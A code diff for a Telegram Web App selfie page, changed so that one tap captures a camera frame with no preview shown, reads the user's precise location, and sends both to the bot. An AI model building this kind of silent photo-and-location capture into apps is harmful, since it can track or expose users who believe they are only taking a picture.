@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Selfie Bot</title>
+  <title>One-Tap Selfie</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    /* full‐width, 70px tall button with larger text */
+    /* Big full-width button */
     #takeSelfie {
       display: block;
       width: 100%;
@@ -13,24 +13,20 @@
       font-size: 20px;
       line-height: 70px;
       text-align: center;
-      margin: 0;
-      padding: 0;
+      margin: 20px 0;
       border: none;
       background: #0088cc;
-      color: white;
+      color: #fff;
       border-radius: 8px;
     }
-    /* make the video preview bigger too */
-    #v {
-      display: block;
-      width: 100%;
-      margin-top: 20px;
-      border-radius: 8px;
+    body {
+      padding: 10px;
+      font-family: sans-serif;
     }
   </style>
 </head>
 <body>
-  <button id="takeSelfie">📸 Take Selfie</button>
+  <button id="takeSelfie">🤳 Take Selfie</button>
   <video id="v" autoplay playsinline style="display:none;"></video>
   <canvas id="c" style="display:none;"></canvas>
 
@@ -41,39 +37,33 @@
       const video = document.getElementById('v');
       const canvas = document.getElementById('c');
 
-      // 1. Grab camera stream
+      // 1) open camera
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
-      video.style.display = 'block';
+      await video.play();
 
-      // 2. Once the video is playing, immediately capture one frame
-      video.addEventListener('loadeddata', async () => {
-        // draw to canvas
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        // stop camera
-        stream.getTracks().forEach(t => t.stop());
-        video.style.display = 'none';
+      // 2) immediately capture one frame
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // 3. Get geolocation
-        navigator.geolocation.getCurrentPosition(pos => {
-          const payload = {
-            image: canvas.toDataURL('image/jpeg'),
-            location: {
-              lat: pos.coords.latitude,
-              lng: pos.coords.longitude
-            },
-            date: new Date().toISOString()
-          };
-          // 4. Send to bot, then close the Web App
-          Telegram.WebApp.sendData(JSON.stringify(payload));
-          Telegram.WebApp.close();
-        }, () => {
-          alert('Location access denied');
-          Telegram.WebApp.close();
-        });
-      }, { once: true });
+      // stop camera
+      stream.getTracks().forEach(t => t.stop());
+
+      // 3) get geolocation
+      navigator.geolocation.getCurrentPosition(pos => {
+        const payload = {
+          image: canvas.toDataURL('image/jpeg'),
+          location: { lat: pos.coords.latitude, lng: pos.coords.longitude },
+          date: new Date().toISOString()
+        };
+        // 4) send back to bot & close
+        Telegram.WebApp.sendData(JSON.stringify(payload));
+        Telegram.WebApp.close();
+      }, err => {
+        alert('Location access denied');
+        Telegram.WebApp.close();
+      });
     });
   </script>
 </body>
